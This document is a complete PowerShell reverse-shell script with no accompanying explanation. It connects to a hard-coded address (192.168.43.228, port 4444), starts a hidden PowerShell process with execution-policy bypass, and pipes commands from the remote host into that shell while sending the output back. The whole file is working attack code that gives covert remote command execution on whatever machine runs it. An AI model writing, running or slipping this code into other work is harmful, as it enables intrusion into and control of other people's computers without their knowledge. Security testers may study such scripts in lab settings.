$serverIP = "192.168.43.228"
$serverPort = 4444

# Connect to the remote server
$tcpClient = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
$stream = $tcpClient.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

# Start PowerShell process with redirection for IO
$processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
$processStartInfo.FileName = "powershell.exe"
$processStartInfo.Arguments = "-ep bypass -nologo"
$processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$processStartInfo.UseShellExecute = $false
$processStartInfo.CreateNoWindow = $true
$processStartInfo.RedirectStandardOutput = $true
$processStartInfo.RedirectStandardError = $true
$processStartInfo.RedirectStandardInput = $true

$powerShellProcess = New-Object System.Diagnostics.Process
$powerShellProcess.StartInfo = $processStartInfo

$powerShellProcess.OutputDataReceived += {
    $data = $_.Data
    if ($data) {
        $writer.WriteLine($data)
    }
}

$powerShellProcess.ErrorDataReceived += {
    $data = $_.Data
    if ($data) {
        $writer.WriteLine($data)
    }
}

$powerShellProcess.Start()
$powerShellProcess.BeginOutputReadLine()
$powerShellProcess.BeginErrorReadLine()

# Handle user input
while ($true) {
    $input = $reader.ReadLine()
    if ($input -eq "exit") {
        break
    }

    $powerShellProcess.StandardInput.WriteLine($input)
}

# Clean up
$powerShellProcess.WaitForExit()
$tcpClient.Close()
